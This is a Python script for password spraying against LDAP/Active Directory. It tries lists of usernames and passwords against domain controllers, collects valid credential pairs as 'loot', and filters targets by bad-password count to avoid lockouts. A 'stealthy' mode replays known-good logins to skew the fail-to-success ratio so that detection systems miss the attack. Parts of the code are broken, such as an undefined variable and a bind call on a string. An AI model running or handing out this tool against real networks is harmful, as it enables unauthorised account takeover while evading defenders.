#!/usr/bin/python
import argparse
import threading
import ldap
import sys
from time import sleep
import time
from getpass import getpass
from subprocess import PIPE, Popen
 
loot = {"success": set(), "fail": set()}
success_fail_counts = {}

class userThread(threading.Thread):
	def __init__(self, user, password='', domain='', ldap_server_obj=None, ldap_server_name=''):
		threading.Thread.__init__(self)
		self.username = user
		self.password = password
		self.domain = domain
		self.ldap_server = ldap_server_obj
		self.ldap_server_name = ldap_server_name

	def run(self):
		while True:
			# Connect to ldap server and test creds.
			if self.username and self.password and self.ldap_server:
				try:
				    #self.ldap_server.protocol_version = ldap.VERSION3
				    #self.ldap_server.set_option(ldap.OPT_REFERRALS,0)
					self.ldap_server.simple_bind_s("%s@%s" % (self.username, self.domain), self.password)
					#print("Valid Credential: %s=%s" % (self.username, self.password))
					success_fail_counts["success"] += 1
					loot["success"].add((self.username, self.password))
					break

				except(ldap.INVALID_CREDENTIALS):
					success_fail_counts["fail"] += 1
					loot["fail"].add(self.username)
					break
				except(ldap.SERVER_DOWN):
					print("Can't contact LDAP server.")
					break
				except(ldap.BUSY):
					#print("busy..")
					sleep(3)
				except Exception, error:
				    print error
				    break
		return None

def ldap_search(filter=""):
	cmd = 'ldapsearch -h X.X.X.X -b dc=example,dc=local -x "(&(objectClass=user)(samaccountname=*)(badpwdcount<=1))" -D user_200@example.local -w password123!  -E pr=500000/noprompt "samaccountname" | egrep -io "samaccountname: .+" | cut -d " " -f2 '
	raw_output = runBash(cmd)
	s = set()
	for user in raw_output:
		user = user.strip()
		if user.strip() not in ["Guest", "krbtgt", "Administrator"] and not user.endswith("$"):
			s.add(user)
	return s

def runBash(cmd):
	p = Popen(cmd, shell=True, stdout=PIPE)
	r = p.stdout.readlines()
	return r

def get_users(opts):
	ldap_server = input("LDAP Server: ")
	ldap_domain = input("LDAP Domain: ")
	username = input("LDAP Username: ")
	password = input("LDAP '%s' Password: " % username)
	ldap.initialize('ldap://%s:3268' % ldap_server)
	ldap_server.simple_bind_s("%s@%s" % (username, domain), password)
		
def print_loot():
	if loot:
		print("\n%s Loot Found! %s" % ("*"*5, "*"*5))
		for creds in loot["success"]:
				print("%s:%s" % creds)
	else:
		print("no loot.")

def setup_ldap(ldap_list):
	d = {}
	for ldap_server in ldap_list:
		# Doesn't error on initialization, 
		# but will during bind if non-existent/unreachable server.
		d[ldap_server] = ldap.initialize('ldap://%s:3268' % ldap_server)
	return d

def pull_list(file_path):
	# Return unique whitespace trimmed list.
	items = set()
	item = None
	if file_path:
		f = open(file_path, "r")
		while item != "":
			item = f.readline().strip()
			items.add(item)
		f.close()
		items.discard("")
		return items
	else:
		return []
		
def process_args():
	parser = argparse.ArgumentParser(description='Enumerate common/shitty passwords by pw spraying against LDAP/AD.')
	parser.add_argument('-u','--users', metavar="<user_list>", type=str, help='File path to user list.')
	parser.add_argument('-p','--passwords', metavar="<pw_list>", type=str, help='File path to password list to use.')
	parser.add_argument('-s','--ldap_servers', metavar="<ldap_servers>", type=str, help='Quoted common seperated list of ldap servers.')
	parser.add_argument('-d','--domain', metavar="<domain>", type=str, help='Domain "example.com"')
	parser.add_argument('-t','--stealthy', action='store_true', help='Hide in noise."')
	return parser.parse_args()

def purge_poll_list(pl, ldap_qcount):
	tmp_poll_list = []
	for thread in pl:
		if thread.is_alive():
			tmp_poll_list.append(thread)
		else:
			ldap_qcount[thread.ldap_server_name] -= 1
	pl = tmp_poll_list

	return pl, ldap_qcount

def pull_fail_success_ratio():
	try:
		fail_perc = float(success_fail_counts["fail"]) / (float(success_fail_counts["fail"]) + success_fail_counts["success"])
	except ZeroDivisionError:
		fail_perc = 0
	return fail_perc

def main():

	# Process args
	opts = process_args()

	# Setup vars
	domain = opts.domain
	users_list = pull_list(opts.users)
	pw_list = pull_list(opts.passwords)
	if opts.ldap_servers:
		ldap_qcount = dict.fromkeys([lserver.strip() for lserver in opts.ldap_servers.split(",") if lserver], 0)
	else:
		print("No LDAP server specified. Exiting.")
		sys.exit()


	# Setup LDAP objects
	ldap_servers = setup_ldap(ldap_qcount.keys())

	max_queue_size = len(ldap_qcount.keys()) * 450
	# Arbitrary 80% min queue value.
	min_queue_size = int(max_queue_size * .80)
	queue_pause_time = 1

	# Main user/pw loop and polling queue.
	poll_list = []
	success_fail_counts["success"] = 0
	success_fail_counts["fail"] = 0
	tick = time.time()
	print("Searching for loot.")
	for password in pw_list:
		for user in users_list:
			if len(poll_list) < max_queue_size:
				fail_perc = pull_fail_success_ratio()
				sys.stdout.write("\rRunning... S:%s F:%s SC:%s FC:%s R:%s" % (len(loot["success"]), len(loot["fail"]), success_fail_counts["success"], success_fail_counts["fail"], fail_perc))
				sys.stdout.flush()
				# Stealthy option performs a check on the fail-to-success ratio,
				# and performs auth attempts using discovered credential pairs
				# to increase the 'count' of successful authentication events.
				# This could bypass [some] detection systems that are calculating
				# a certain ratio threshold. (:
				if opts.stealthy:
					if success_fail_counts["success"] > 0:
						fail_perc = pull_fail_success_ratio()
						sys.stdout.write("\rRunning... S:%s F:%s SC:%s FC:%s R:%s" % (len(loot["success"]), len(loot["fail"]), success_fail_counts["success"], success_fail_counts["fail"], fail_perc))
						sys.stdout.flush()
						# Check fail:success ratio.
						while fail_perc >= 0.75:
							# Start pushing known valid cred pairs into queue to 
							# influence the fail:success ratio - stealthy eh?
							for credpair in loot["success"]:
								ldap_tribute = min(ldap_qcount, key=ldap_qcount.get)
								ldap_qcount[ldap_tribute] += 1
								poll_list.append(userThread(credpair[0], credpair[1], domain, ldap_servers[ldap_tribute], ldap_tribute))
								poll_list[-1].start()
								poll_list, ldap_qcount = purge_poll_list(poll_list, ldap_qcount)
							fail_perc = pull_fail_success_ratio()

				ldap_tribute = min(ldap_qcount, key=ldap_qcount.get)
				ldap_qcount[ldap_tribute] += 1
				poll_list.append(userThread(user, password, domain, ldap_servers[ldap_tribute], ldap_tribute))
				poll_list[-1].start()
				poll_list, ldap_qcount = purge_poll_list(poll_list, ldap_qcount)
			else:
				# Churn through poll_list queue until
				# lower 'min_queue_size' threshold is met.
				while len(poll_list) >= min_queue_size:
					poll_list, ldap_qcount = purge_poll_list(poll_list, ldap_qcount)
					sleep(queue_pause_time)

	tock2 = 0
	tick2 = time.time()
	print("\nFinished checking list. Waiting for queue to empty.")
	while len(poll_list) > 0 and (tock2 - tick2) < 30:
		print("%s items in the queue." % len(poll_list))
		poll_list, ldap_qcount = purge_poll_list(poll_list, ldap_qcount)
		sleep(queue_pause_time)
		tock2 = time.time()
	tock = time.time()
	print("\nTotal duration: %s in seconds" % (tock - tick))

	print print_loot()

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()


